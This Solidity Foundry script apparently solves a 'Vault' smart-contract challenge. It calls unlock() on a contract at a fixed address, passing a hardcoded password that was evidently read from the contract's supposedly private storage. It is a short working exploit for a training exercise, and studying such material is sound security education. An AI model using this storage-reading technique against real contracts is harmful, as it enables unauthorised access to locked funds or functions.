// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Vault} from "../../src/Vault/Vault.sol";
import {Script} from "../../lib/forge-std/src/Script.sol";
import {console} from "../../lib/forge-std/src/console.sol";

contract VaultSolution is Script {
    Vault public vaultInstance = Vault(0xfD927Bf8E019044729d84bC3F80C4d7e210d713F);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vaultInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);

        vm.stopBroadcast();
    }
}
